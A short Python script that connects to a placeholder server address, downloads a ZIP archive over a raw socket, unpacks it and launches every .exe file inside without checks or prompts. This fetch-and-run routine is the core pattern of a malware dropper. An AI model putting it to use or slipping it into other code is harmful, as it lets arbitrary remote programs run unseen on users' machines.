import socket
import zipfile
import os
import subprocess
import time

def receive_file():
    time.sleep(5)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("Server IP address", 8000))   
    with open('received_files.zip', 'wb') as file:
        while True:
            data = client_socket.recv(1024) 
            if not data:
                break
            file.write(data)
    
    client_socket.close()

    # Unpacking ZIP archive
    extraction_path = r"directory where the archive will be unpacked"
    os.makedirs(extraction_path, exist_ok=True)

    
    with zipfile.ZipFile('received_files.zip', 'r') as zip_ref:
        zip_ref.extractall(extraction_path)  # Unpack to the specified folderу
    
    # Run all .exe files from the unzipped folder
    for filename in os.listdir(extraction_path):
        if filename.endswith('.exe'):
            exe_path = os.path.join(extraction_path, filename)
            subprocess.Popen(exe_path)  # Launching .exe files

if __name__ == "__main__":
    receive_file()